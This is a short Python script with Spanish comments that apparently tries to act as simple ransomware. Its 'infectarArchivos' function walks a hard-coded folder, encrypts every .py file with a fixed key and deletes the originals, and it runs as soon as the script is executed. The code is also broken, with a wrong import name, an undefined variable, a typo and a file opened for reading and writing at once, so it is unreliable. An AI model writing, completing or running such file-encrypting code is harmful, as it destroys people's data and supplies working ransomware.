import OS #Entender mas de instalacion de modulos

from simplecrypt import encrypt

path = 'E:/Tera/Pruebas'
key = "prueba"

# fFncion cifrado_basico para metetodo de cifrado
def cifrado_basico(key, archivoSalida = None):
    if not archivoSalida:
        archivoSalida = archivoEntrada + '.encrypt'

        #da el tamaño de archivo de entrada
    size = os.path.getsize(archivoEntrada)

    with open(archivoEntrada, 'rb') as ifile:
        with open(archivoEntrada, 'wb') as ofile:
            cifrar = encrypt(key, ifile.read())
            ofile.write(cifrar)
#Funcion de infectar archivos
def infectarArchivos():

    for root, direcs, archivos in os.walk(path):
        for archivo in archivos:
            if archivo.endswith('.py'):
                cifrado_basico(key, ospath.join(root, archivo))
                os.remove(os.path.join(root, archivo))

infectarArchivos()
